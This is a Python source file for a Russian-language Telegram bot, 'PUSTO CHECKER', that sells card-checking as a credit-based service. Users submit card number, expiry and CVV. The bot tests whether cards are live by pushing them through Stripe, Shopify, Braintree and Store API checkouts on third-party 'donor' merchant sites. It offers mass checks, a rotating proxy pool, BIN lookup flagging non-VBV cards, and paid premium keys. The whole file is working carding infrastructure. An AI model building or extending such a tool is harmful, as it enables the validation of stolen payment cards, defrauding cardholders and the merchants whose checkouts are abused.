# language: Python 3.12+, file: bot/main.py, target: Windows 11, deps: pyrogram tgcrypto
# Sprint 4: TG-бот поверх движков. Запуск:
#   PUSTO_BOT_TOKEN=... python -m bot.main
# Команды: /start /cmds /me /key <key> /setupwoo cc|mm|yy|cvv /piconfirm cc|mm|yy|cvv
# Админ: /addcredits <uid> <n> /addpremium <uid> <days> /genkey <credits|days:d>
import asyncio
import html
import json
import os
import re
import secrets as _secrets
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message

import gate_client as gc
import setup_gate
import hit_gate as hit_engine  # Stripe Checkout /hit (cs_live hosted)
import config as engine_cfg  # корневой config проекта (HIT_VERDICTS таксономии)
from bot import config, db
from bot.gates import load_gates
from bot.utils import formatter

db.init_db()
GATES = load_gates()
TG_API_ID = int(os.environ.get("PUSTO_TG_API_ID", "6"))
TG_API_HASH = os.environ.get("PUSTO_TG_API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Client("pusto_bot", workdir=str(Path(__file__).parent),
             api_id=TG_API_ID, api_hash=TG_API_HASH,
             bot_token=config.BOT_TOKEN or None)

# Единый источник хитов: корневая таксономия + бот-специфичные (3DS-живость, оплаты)
HIT_VERDICTS = set(engine_cfg.HIT_VERDICTS) | {"APPROVED@PAID", "3DS_FRICTIONLESS",
                                                "3DS_CHALLENGE"}


def me_line(u: dict) -> str:
    prem = db.is_premium(u)
    return (f"ID: <code>{u['user_id']}</code>\n"
            f"Баланс: <b>{u['credits']}</b> кр.{' | ♦ Премиум' if prem else ''}\n"
            f"Проверок: {u['total_checks']} | Успешных: {u['hits']}")


def admin_only(func):
    async def wrapped(client, message: Message):
        if message.from_user and message.from_user.id in config.ADMIN_IDS:
            return await func(client, message)
        return await message.reply("Доступ только для администраторов.")
    return wrapped


def user_only(func):
    """Guard: в каналах/анонимных сообщениях from_user=None → тихий краш без ответа."""
    async def wrapped(client, message: Message):
        if message.from_user is None:
            return
        return await func(client, message)
    return wrapped


CREATOR_NICK = os.environ.get("PUSTO_CREATOR_NICK", "Владимир")

GATE_ALIASES = {
    "au": "setupwoo",
    "st": "storegate",
    "sh": "storegate",   # исторический алиас /sh = Store API (агент переопределил — возвращено)
    "sp": "shopify",     # Shopify Checkout
    "pi": "piconfirm",
    "vbv": "braintreenvbv",
    "b3": "braintreenvbv",
}


# Человеческие имена гейтов/тиров для вывода (вместо storegate$1)
GATE_LABELS = {
    "setupwoo": "Stripe Auth",
    "storegate": "Store API",
    "shopify": "Shopify Checkout",
    "piconfirm": "PI Confirm",
    "braintreenvbv": "Braintree VBV",
    "hit": "Checkout /hit",
}
TIER_LABELS = {"1": "<$1", "5": "$1–5", "20": "$5–20",
               "low": "<$1", "mid": "$1–5", "high": "$5–20"}


def gate_label(gate_name: str, tier: str | None = None) -> str:
    base = GATE_LABELS.get(gate_name, gate_name)
    if tier:
        return f"{base} ({TIER_LABELS.get(tier, tier)})"
    return base


def _card_fields(text: str) -> list[str] | None:
    """CC|MM|YY|CVV / CC MM YY CVV / 4-блочный PAN + MM YY CVV -> [cc, mm, yy, cvv].
    Раньше '4111 1111 1111 1111 09 25 123' парсился как cc=4111 mm=1111 — мусор."""
    parts = text.replace("|", " ").replace(":", " ").replace("/", " ").split()
    if len(parts) == 7 and all(re.fullmatch(r"\d{4}", p) for p in parts[:4]):
        parts = ["".join(parts[:4])] + parts[4:]
    return parts if len(parts) == 4 else None


def build_start_menu(u: dict, creator: str = CREATOR_NICK) -> str:
    is_dev = db.is_developer(u)
    is_prem = db.is_premium(u)
    if is_dev:
        tier_str = "Developer (Unlimited)"
        tier_icon = "👑"
        limit_str = "∞"
    elif is_prem:
        tier_str = "Premium"
        tier_icon = "💎"
        limit_str = "Чеки без кредитов · /mass до 20 карт"
    else:
        tier_str = "Free"
        tier_icon = "🎫"
        limit_str = f"{config.START_CREDITS} стартовых кредитов · /mass до 20 карт"

    return (
        "✦ <b>PUSTO CHECKER</b> ✦\n\n"
        "★ <b>𝑾𝑬𝑳𝑪𝑶𝑴𝑬</b> ★\n\n"
        f"{tier_icon} <b>Tier</b> : {tier_str}\n"
        f"📊 <b>Limit</b> : {limit_str}\n"
        "🎟 <b>Redeem</b> : <code>/redeem &lt;key&gt;</code>\n\n"
        "⚡ <b>𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺</b> ⚡\n\n"
        "💳 <code>/au</code> cc — Stripe $0 Auth (SetupIntent)\n"
        "💳 <code>/st</code> [1|5|20] cc — Store API (цена: &lt;$1 / $1-5 / $5-20)\n"
        "💳 <code>/sp</code> [1|5|20] cc — Shopify Checkout (цена: &lt;$1 / $1-5 / $5-20)\n"
        "⚡ <code>/hit</code> url cc — Stripe Checkout (готовый cs_live-линк)\n"
        "🔍 <code>/bin</code> bin — BIN Lookup\n"
        "📁 <code>/mass</code> [гейт] — Mass Check (≤20 карт, .txt или текст)\n\n"
        "🌐 <b>𝑷𝑹𝑶𝑿𝑰𝑬𝑺</b> 🌐\n\n"
        "📡 <code>/addproxy</code> — Add proxies (text/file)\n"
        "📡 <code>/proxy</code> — Check &amp; clean proxies\n"
        "📡 <code>/clearproxy</code> — Clear all proxies\n"
        "───────────────────────\n"
        f"✈️ Made by <i>{creator}</i>"
    )


@app.on_message(filters.command(["start", "cmds", "help"]))
@user_only
async def cmd_start(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    await message.reply(build_start_menu(u), parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["me"]))
@user_only
async def cmd_me(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    await message.reply(me_line(db.get_user(message.from_user.id)), parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["key", "redeem"]))
@user_only
async def cmd_key(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    parts = (message.text or "").split()
    if len(parts) != 2:
        return await message.reply("Формат: <code>/redeem КЛЮЧ</code> или <code>/key КЛЮЧ</code>", parse_mode=ParseMode.HTML)
    await message.reply(db.redeem_key(message.from_user.id, parts[1]))


@app.on_message(filters.command(["proxy"]))
@user_only
async def cmd_proxy(client, message: Message):
    proxies = gc.load_proxies()
    if not proxies:
        return await message.reply("📡 <b>Прокси-пул:</b> пуст (прямое подключение)\nДобавить: <code>/addproxy host:port</code> или файлом.", parse_mode=ParseMode.HTML)
    await message.reply(
        f"📡 <b>Прокси-пул:</b> {len(proxies)} шт.\n"
        f"• Управление: <code>/addproxy</code> (админ) | Очистить: <code>/clearproxy</code> (админ)",
        parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["addproxy"]))
@admin_only
@user_only
async def cmd_addproxy(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    text = ""
    if message.reply_to_message and message.reply_to_message.document:
        doc = await message.reply_to_message.download(in_memory=True)
        text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif message.document:
        doc = await message.download(in_memory=True)
        text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    else:
        parts = (message.text or "").split(maxsplit=1)
        if len(parts) > 1:
            text = parts[1]

    lines = [l.strip() for l in text.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        return await message.reply("Формат: <code>/addproxy host:port</code> (или ответом на .txt файл)", parse_mode=ParseMode.HTML)

    os.makedirs("data", exist_ok=True)
    p_path = os.path.join("data", "proxies.txt")
    with open(p_path, "a", encoding="utf-8") as f:
        for l in lines:
            f.write(l + "\n")
    total = len(gc.load_proxies())
    await message.reply(f"✅ Добавлено <b>{len(lines)}</b> прокси. Всего в пуле: <b>{total}</b> шт.", parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["clearproxy"]))
@admin_only
async def cmd_clearproxy(client, message: Message):
    p_path = os.path.join("data", "proxies.txt")
    if os.path.exists(p_path):
        with open(p_path, "w", encoding="utf-8") as f:
            f.write("")
    await message.reply("🧹 Прокси-пул очищен.", parse_mode=ParseMode.HTML)


async def run_gate(message: Message, gate_name: str, argline: str):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
    meta = GATES.get(gate_name)
    if not meta:
        return await message.reply(f"❌ Гейт {gate_name} не найден")
    # ценовой тир для storegate / shopify: '/st 1|5|20 CC MM YY CVV' — первый
    # короткий токен из PRICE_TIERS, карта начинается с 13-19 цифр — не спутается
    tier = None
    toks = argline.split()
    if toks:
        from bot.gates.storegate import parse_tier as _parse_tier_sg
        from bot.gates.shopify import parse_tier as _parse_tier_sp
        if _parse_tier_sg(toks[0]) is not None or _parse_tier_sp(toks[0]) is not None:
            tier = toks[0].lower()
            argline = " ".join(toks[1:])
    # формат валидируется ДО списания кредитов — кривой ввод не сжигает баланс
    parts = _card_fields(argline)
    if parts is None:
        return await message.reply(f"Формат: /{gate_name} CC MM YY CVV")
    if not gc.check_luhn("".join(ch for ch in parts[0] if ch.isdigit())):
        return await message.reply("❌ Неверный номер карты (Luhn fail)")
    cost = (meta["cost"] if meta["cost"] is not None else config.GATE_COST.get(gate_name, 1))
    if not db.spend_credit(u_id, gate_name):
        return await message.reply(f"❌ Недостаточно кредитов ({cost}/чек). Используйте /redeem для пополнения")
    status_msg = await message.reply(f"💳 Проверка · {gate_label(gate_name, tier)}...")
    t0 = asyncio.get_event_loop().time()
    bin6 = "".join(ch for ch in parts[0] if ch.isdigit())[:6]
    binfo_task = asyncio.ensure_future(setup_gate.bin_lookup(bin6))
    try:
        if tier and gate_name in ("storegate", "shopify"):
            res = await meta["fn"](*parts, tier=tier)
        else:
            res = await meta["fn"](*parts)
        verdict, detail = res[0], res[1]
        gate_extra = res[2] if len(res) > 2 else {}
    except Exception as e:
        verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:180]
        gate_extra = {}
    if verdict == "ERROR":
        db.refund_credit(u_id, gate_name)  # сбой движка — кредит возвращается
    latency_ms = int((asyncio.get_event_loop().time() - t0) * 1000)
    try:
        binfo = await asyncio.wait_for(binfo_task, timeout=4)
    except Exception:
        binfo = {}
    if verdict in HIT_VERDICTS:
        db.add_hit(u_id)
    # админ-блок: прокси этого запроса + живой пул (динамически, на каждый чек)
    a_proxy = a_pool = None
    if u_id in config.ADMIN_IDS:
        a_proxy = gate_extra.get("proxy")
        a_pool = len(gc.load_proxies())
    await status_msg.edit_text(
        formatter.format_single(parts[0], binfo, gate_label(gate_name, tier), verdict,
                                detail, latency_ms, proxy=a_proxy, pool_size=a_pool),
        parse_mode=ParseMode.HTML)

ALL_GATE_CMDS = list(GATES.keys()) + list(GATE_ALIASES.keys())


@app.on_message(filters.command(ALL_GATE_CMDS or ["none"]))
@user_only
async def gate_dispatch(client, message: Message):
    # команда может прийти caption'ом к медиа — message.text тогда None
    raw = message.text or message.caption or ""
    parts = raw.split()
    if not parts:
        return
    cmd = parts[0].lstrip("/").split("@")[0].lower()
    gate_name = GATE_ALIASES.get(cmd, cmd)
    if gate_name in GATES:
        argline = " ".join(parts[1:])
        await run_gate(message, gate_name, argline)


# --- мультигейт: порядок выбора для /mass (форс первым аргументом) ---

GATE_PRIORITY = ["setupwoo", "storegate", "shopify", "piconfirm", "braintreenvbv"]


def _available_gates() -> list[str]:
    """A7: только гейты с реально настроенными целями."""
    from bot.gates.storegate import _targets as _st_targets
    from bot.gates.shopify import _targets as _sp_targets
    from bot.gates.piconfirm import _target as _pi_target
    from bot.gates.braintreenvbv import _targets as _bt_targets
    try:
        has_store = bool(_st_targets())
    except Exception:
        has_store = False
    try:
        has_shopify = bool(_sp_targets())
    except Exception:
        has_shopify = False
    try:
        has_pi = bool(_pi_target())
    except Exception:
        has_pi = False
    try:
        has_bt = bool(_bt_targets())
    except Exception:
        has_bt = False
    ok = {"setupwoo": True,  # пул с fallback-донором — доступен всегда
          "storegate": has_store,
          "shopify": has_shopify,
          "piconfirm": has_pi,
          "braintreenvbv": has_bt}
    return [g for g in GATE_PRIORITY if ok.get(g) and g in GATES]


def _pick_gate(force: str | None) -> str | None:
    """Приоритет: живой SetupIntent-донор -> Store API -> PI secret -> VBV."""
    if force:
        return force if force in GATES else None
    for g in _available_gates():
        return g
    return None





@app.on_message(filters.command(["hit"]))
@user_only
async def cmd_hit(client, message: Message):
    """Stripe Checkout /hit: /hit <cs_live-url> CC|MM|YY|CVC — проверка по готовому чекаут-линку."""
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
    raw = (message.text or message.caption or "").split()
    if len(raw) < 3 or not raw[1].startswith("http") or "cs_" not in raw[1]:
        return await message.reply("Формат: <code>/hit &lt;cs_live-url&gt; CC|MM|YY|CVC</code> — линк любого Stripe Checkout (checkout.stripe.com, pay.*, buy.stripe.com)", parse_mode=ParseMode.HTML)
    target_url = raw[1]
    card_line = " ".join(raw[2:])
    parts = _card_fields(card_line)
    if parts is None:
        return await message.reply("Формат карты: CC MM YY CVV")
    if not gc.check_luhn("".join(ch for ch in parts[0] if ch.isdigit())):
        return await message.reply("❌ Неверный номер карты (Luhn fail)")
    if not db.spend_credit(u_id, "hit"):
        return await message.reply("❌ Недостаточно кредитов (2/чек)")
    status_msg = await message.reply(f"💳 Проверка · {gate_label('hit')}...")
    t0 = asyncio.get_event_loop().time()
    bin6 = "".join(ch for ch in parts[0] if ch.isdigit())[:6]
    binfo_task = asyncio.ensure_future(setup_gate.bin_lookup(bin6))
    gs = hit_engine.CsHitSession(target_url)
    try:
        ok, detail = await gs.open()
        if not ok:
            db.refund_credit(u_id, "hit")
            await status_msg.edit_text(f"❌ Линк не открыт: {detail}")
            return
        res = await gs.check_card("|".join(parts))
    except Exception as e:
        res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:180]}
    finally:
        await gs.close()
    verdict = res.get("status", "ERROR")
    detail = res.get("detail", "")
    amount = res.get("amount_cents") or 0
    currency = res.get("currency") or ""
    if verdict == "ERROR":
        db.refund_credit(u_id, "hit")
    else:
        price_s = formatter.fmt_price(amount, currency)
        detail = f"[{price_s}] {detail}" if price_s else detail
    latency_ms = int((asyncio.get_event_loop().time() - t0) * 1000)
    try:
        binfo = await asyncio.wait_for(binfo_task, timeout=4)
    except Exception:
        binfo = {}
    if verdict in HIT_VERDICTS:
        db.add_hit(u_id)
    a_proxy = None
    a_pool = None
    if u_id in config.ADMIN_IDS:
        a_pool = len(gc.load_proxies())
    await status_msg.edit_text(
        formatter.format_single(parts[0], binfo, gate_label("hit"), verdict,
                                detail, latency_ms, proxy=a_proxy, pool_size=a_pool),
        parse_mode=ParseMode.HTML)



@app.on_message(filters.command(["mass"]))
@user_only
async def cmd_mass(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")

    cards_text = ""
    gate_forced = None

    parts = (message.text or "").split()
    if len(parts) > 1 and GATE_ALIASES.get(parts[1], parts[1]) in GATES:
        gate_forced = GATE_ALIASES.get(parts[1], parts[1])
        raw_tail = " ".join(parts[2:])
    else:
        raw_tail = " ".join(parts[1:])

    # Check if document / reply
    if message.reply_to_message and message.reply_to_message.document:
        doc = await message.reply_to_message.download(in_memory=True)
        cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif message.document:
        doc = await message.download(in_memory=True)
        cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif raw_tail.strip():
        cards_text = raw_tail

    if not cards_text.strip():
        return await message.reply(
            "<b>Использование массовой проверки:</b>\n"
            "• <code>/mass [гейт] CC|MM|YY|CVV\nCC|MM|YY|CVV...</code>\n"
            "• Или ответом на .txt файл: <code>/mass [гейт]</code>\n"
            "(Максимум 20 карт за раз)", parse_mode=ParseMode.HTML)

    # запятые: между картами ИЛИ между полями одной карты — раньше глобальный
    # replace(",", "\n") рвал "4111,1111,1111,1111,09,25,123" на мусорные строки
    raw_lines = []
    for ln in cards_text.splitlines():
        ln = ln.strip()
        if not ln:
            continue
        if "," in ln:
            chunks = [c.strip() for c in ln.split(",")]
            if len(chunks) >= 4 and all(re.fullmatch(r"[\d ]+", c) for c in chunks if c):
                # все чанки числовые — это одна карта с запятыми между полями
                raw_lines.append(" ".join(c for c in chunks if c))
            else:
                raw_lines.extend(c for c in chunks if c)  # карты через запятую
        else:
            raw_lines.append(ln)

    valid_cards = []
    for ln in raw_lines:
        fields = _card_fields(ln)
        if fields is not None:
            valid_cards.append(fields)

    if not valid_cards:
        return await message.reply("❌ Не найдено карт в подходящем формате (ожидается CC MM YY CVV).")

    if len(valid_cards) > 20:
        await message.reply(f"⚠️ Лимит 20 карт за прогон — взяты первые 20 из {len(valid_cards)}.")
    valid_cards = valid_cards[:20]

    gate_name = _pick_gate(gate_forced)
    if not gate_name:
        return await message.reply("Нет загруженных гейтов")

    meta = GATES[gate_name]
    cost_per = (meta["cost"] if meta["cost"] is not None else config.GATE_COST.get(gate_name, 1))

    u = db.get_user(u_id)
    is_prem = db.is_premium(u)
    if not is_prem and u.get("credits", 0) < len(valid_cards) * cost_per:
        return await message.reply(f"❌ Недостаточно кредитов. Требуется {len(valid_cards) * cost_per} кредитов на {len(valid_cards)} карт.")

    status_msg = await message.reply(f"🚀 Запуск массовой проверки ({len(valid_cards)} карт) через <b>{gate_name}</b>...", parse_mode=ParseMode.HTML)

    # A5 (ИССЛЕДОВАНИЕ-СКОРОСТЬ.md): параллельный прогон вместо поочерёдного
    # с sleep 1.5с — semaphore(5) держит вежливый темп к донору (Stripe ~20
    # concurrent), 20 карт идут ~4 волнами вместо 20×latency
    mass_sem = asyncio.Semaphore(5)
    stop_evt = asyncio.Event()  # кредиты кончились — хвост не запускаем

    async def _check_one(card_parts: list[str]) -> dict | None:
        if stop_evt.is_set():
            return None
        async with mass_sem:
            if stop_evt.is_set():
                return None
            if not db.spend_credit(u_id, gate_name):
                stop_evt.set()
                return {"card": " ".join(card_parts), "status": "ERROR",
                        "detail": "Недостаточно кредитов"}
            try:
                verdict, detail = await meta["fn"](*card_parts)
            except Exception as e:
                verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:100]
            if verdict == "ERROR":
                db.refund_credit(u_id, gate_name)  # сбой движка — кредит возвращается
            return {"card": formatter.fmt_pan(card_parts[0]),
                    "status": verdict, "detail": str(detail)[:60],
                    "_hit": verdict in HIT_VERDICTS}

    raw_results = await asyncio.gather(*[_check_one(cp) for cp in valid_cards])
    mass_results = []
    approved_count = 0
    for r in raw_results:
        if r is None:
            continue
        if r.pop("_hit", False):
            db.add_hit(u_id)
            approved_count += 1
        mass_results.append(r)

    pool_line = ""
    if u_id in config.ADMIN_IDS:
        pool_line = f" | 📡 Пул: {len(gc.load_proxies())}"
    summary = (f"🏁 <b>Массовая проверка завершена ({len(mass_results)}/{len(valid_cards)})</b>\n"
               f"Гейт: <code>{gate_name}</code> | Одобрено: <b>{approved_count}</b>{pool_line}\n\n"
               + formatter.format_mass(mass_results, header=False))
    # TG-лимит 4096 — режем на части по строкам
    chunk, chunks = [], []
    for line in summary.split("\n"):
        if len("\n".join(chunk)) + len(line) + 1 > 3900:
            chunks.append("\n".join(chunk))
            chunk = []
        chunk.append(line)
    chunks.append("\n".join(chunk))
    await status_msg.edit_text(chunks[0], parse_mode=ParseMode.HTML)
    for extra in chunks[1:]:
        await message.reply(extra, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["bin"]))
@user_only
async def cmd_bin(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
    parts = (message.text or "").split()
    if len(parts) < 2:
        return await message.reply("Формат: /bin 123456")
    bin_query = "".join(ch for ch in parts[1] if ch.isdigit())[:6]
    if len(bin_query) < 6:
        return await message.reply("❌ БИН должен содержать минимум 6 цифр")
    status_msg = await message.reply(f"🔍 Запрос информации о БИН <code>{bin_query}</code>...", parse_mode=ParseMode.HTML)
    binfo = await gc.bin_lookup_enriched(bin_query)
    if not binfo or not binfo.get("scheme"):
        binfo = await setup_gate.bin_lookup(bin_query)

    scheme = (binfo.get("scheme") or binfo.get("brand") or "Неизвестно").upper()
    card_type = (binfo.get("type") or "Неизвестно").upper()
    level = (binfo.get("level") or "Standard").upper()
    bank = (binfo.get("bank") or {}).get("name") or "Неизвестно"
    country = binfo.get("country") or {}
    c_name = country.get("name") or "Неизвестно"
    c_a2 = country.get("alpha2") or ""
    is_vbv = binfo.get("is_vbv")
    vbv_str = "✅ ДА (3DS подключен)" if is_vbv is True else ("❌ НЕТ (Non-VBV)" if is_vbv is False else "❓ Неизвестно")

    esc = lambda s: html.escape(str(s), quote=False)
    text = (
        f"💳 <b>Информация о БИН:</b> <code>{bin_query}</code>\n\n"
        f"🏦 <b>Банк:</b> {esc(bank)}\n"
        f"🏷 <b>Система:</b> {esc(scheme)}\n"
        f"📋 <b>Тип:</b> {esc(card_type)} ({esc(level)})\n"
        f"🌍 <b>Страна:</b> {esc(c_name)} {f'({esc(c_a2)})' if c_a2 else ''}\n"
        f"🛡 <b>3DS / VBV:</b> {vbv_str}\n"
    )
    await status_msg.edit_text(text, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["gates"]))
@user_only
async def cmd_gates(client, message: Message):
    lines = ["<b>Активные гейты движка:</b>"]
    for k, v in GATES.items():
        cost = v["cost"] if v["cost"] is not None else config.GATE_COST.get(k, 1)
        lines.append(f"• <code>/{k}</code> — стоимость: {cost} кр.")

    data_dir = os.path.join(os.path.dirname(__file__), "..", "data")

    def load_json(name):
        p = os.path.join(data_dir, name)
        if os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8") as f:
                    d = json.load(f)
                return d if isinstance(d, list) else []
            except Exception:
                return []
        return []

    # SetupIntent-доноры (готовая ротация setup_gate); только реально READY
    ready = [g for g in load_json("ready_gates.json")
             if g.get("status", "READY") == "READY"]
    if ready:
        lines.append(f"\n<b>SetupIntent доноры ($0-auth):</b> ({len(ready)} онлайн)")
        for g in ready[:10]:
            dom = g.get("domain") or g.get("base_url")
            st = g.get("status", "READY")
            sr = int(float(g.get("success_rate") or 0.5) * 100)
            lat = g.get("latency_avg_ms")
            lat_s = f"{lat}мс" if lat is not None else "?"
            lines.append(f"  [{st}] <code>{dom}</code> ({sr}% SR | {lat_s})")

    # Store API / mint-гейты (фаза store-расширения); мёртвые и фантомные скрыты
    store = [g for g in load_json("store_gates.json")
             if not g.get("phantom") and not g.get("dead_surface")]
    if store:
        verified = [g for g in store if g.get("verified")]
        mint = [g for g in store if g.get("verify_status") == "APPROVED@PAID"
                and not g.get("verified")]
        lines.append(f"\n<b>Store-API гейты:</b> "
                     f"{len(store)} поверхностей | {len(verified)} проверено | {len(mint)} минт")
        for g in verified[:10]:
            dom = g.get("domain")
            vs = g.get("verify_status", "?")
            cheap = g.get("cheapest_cents")
            cheap_s = f" | от {cheap}¢" if cheap is not None else ""
            lines.append(f"  [✅ {vs}]{cheap_s} <code>{dom}</code>")
        for g in mint[:5]:
            lines.append(f"  [⚗️ PI_MINT] <code>{g.get('domain')}</code>")

    # Финальный сводный пул
    final = load_json("final_gates.json")
    if final:
        by_vec = {}
        for g in final:
            by_vec.setdefault(g.get("vector", "?"), []).append(g)
        lines.append(f"\n<b>Общий пул:</b> {len(final)} доноров ("
                     + " | ".join(f"{k}: {len(v)}" for k, v in by_vec.items()) + ")")
    await message.reply("\n".join(lines), parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["stats"]))
@user_only
async def cmd_stats(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    g_stats = db.get_global_stats()

    prem = db.is_premium(u)
    text = (
        f"📊 <b>Личная статистика:</b>\n"
        f"• ID пользователя: <code>{u['user_id']}</code>\n"
        f"• Статус: {'♦ <b>ПРЕМИУМ</b>' if prem else 'Базовый'}\n"
        f"• Кредиты: <b>{u['credits']}</b>\n"
        f"• Проверок: <b>{u['total_checks']}</b>\n"
        f"• Успешных (Live): <b>{u['hits']}</b>\n\n"
        f"🌐 <b>Общая статистика:</b>\n"
        f"• Пользователей: <b>{g_stats['users_count']}</b>\n"
        f"• Премиум пользователей: <b>{g_stats['premium_users']}</b>\n"
        f"• Всего проверок: <b>{g_stats['total_checks']}</b>\n"
        f"• Всего Live-хитов: <b>{g_stats['total_hits']}</b>\n"
    )
    await message.reply(text, parse_mode=ParseMode.HTML)



# --- admin ---

@app.on_message(filters.command(["addcredits"]))
@admin_only
@user_only
async def addcredits(client, message: Message):
    p = (message.text or "").split()
    if len(p) != 3 or not p[1].lstrip("-").isdigit() or not p[2].lstrip("-").isdigit():
        return await message.reply("Формат: /addcredits UID N")
    with db.connect() as c:
        cur = c.execute("UPDATE users SET credits = MAX(0, credits + ?) WHERE user_id=?",
                        (int(p[2]), int(p[1])))
        if not cur.rowcount:
            return await message.reply(f"UID {p[1]} не найден")
    await message.reply(f"Готово: UID {p[1]} кредиты {int(p[2]):+d}")


@app.on_message(filters.command(["addpremium"]))
@admin_only
@user_only
async def addpremium(client, message: Message):
    import time as _t
    p = (message.text or "").split()
    if len(p) != 3 or not p[2].isdigit():
        return await message.reply("Формат: /addpremium UID ДНИ")
    uid, days = int(p[1]), int(p[2])
    base = max(int(db.get_user(uid).get("premium_until") or 0), int(_t.time()))
    with db.connect() as c:
        cur = c.execute("UPDATE users SET premium_until=? WHERE user_id=?",
                        (base + days * 86400, uid))
        if not cur.rowcount:
            return await message.reply(f"UID {uid} не найден")
    await message.reply(f"Готово: UID {uid} премиум +{days} дн.")


@app.on_message(filters.command(["genkey"]))
@admin_only
async def genkey(client, message: Message):
    """Формат: /genkey КРЕДИТЫ или /genkey 0 ДНИ — ключ одноразовый."""
    p = (message.text or "").split()
    credits = int(p[1]) if len(p) > 1 and p[1].isdigit() else 0
    days = int(p[2]) if len(p) > 2 and p[2].isdigit() else 0
    key = _secrets.token_hex(8)
    db.add_key(key, days=days, credits=credits)
    await message.reply(f"Ключ: <code>{key}</code> ({credits} кр. / {days} дн.)",
                        parse_mode=ParseMode.HTML)


if __name__ == "__main__":
    session_file = Path(__file__).parent / "pusto_bot.session"
    if not config.BOT_TOKEN and not session_file.exists():
        print("[!] set PUSTO_BOT_TOKEN env (from @BotFather)")
        print(f"[*] gates loaded: {list(GATES)}")
        sys.exit(1)
    print(f"[*] gates loaded: {list(GATES)}")
    auth = f"token {config.BOT_TOKEN[:8]}..." if config.BOT_TOKEN else \
        f"session {session_file.name}"
    print(f"[*] auth: {auth}")
    print("[*] bot is up — polling Telegram (Ctrl+C to stop)")
    app.run()
